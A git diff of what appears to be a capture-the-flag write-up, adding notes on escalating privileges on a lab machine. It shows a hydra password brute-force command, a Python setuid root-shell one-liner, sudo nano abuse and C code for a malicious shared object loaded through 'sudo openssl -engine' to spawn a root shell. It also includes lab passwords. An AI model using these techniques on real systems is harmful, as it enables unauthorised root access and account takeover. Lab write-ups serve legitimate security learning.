@@ -74,7 +74,9 @@ python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
 ```
 id_rsa:stephani
 ```
-##### privilege escalation of `gcrawford` user<br/>
+##### privilege escalation of `gcrawford` user cuz of sudo ability over `nano`<br/>
+
+We can see nano's [Gtfo-Bins](https://gtfobins.github.io/gtfobins/nano/)
 
 ```
 sudo nano
@@ -90,7 +92,23 @@ password: tonyhawk<br />
 hydra -l plague -P /usr/share/wordlists/rockyou.txt 10.10.68.205 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect"
 ```
 
-##### You can get a rev shell with user `production` logged in and can achieve privilage escalation using -<br />
+##### You can get a rev shell with user `production` logged in and can achieve privilage escalation using this c code -<br />
+
+Check out this blog for more on it [ld_preload-privesc](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init(){
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
+}
+```
+
+`gcc -o shell.so shell.c`
+
 
 ```
 sudo openssl req -engine ./shell.so
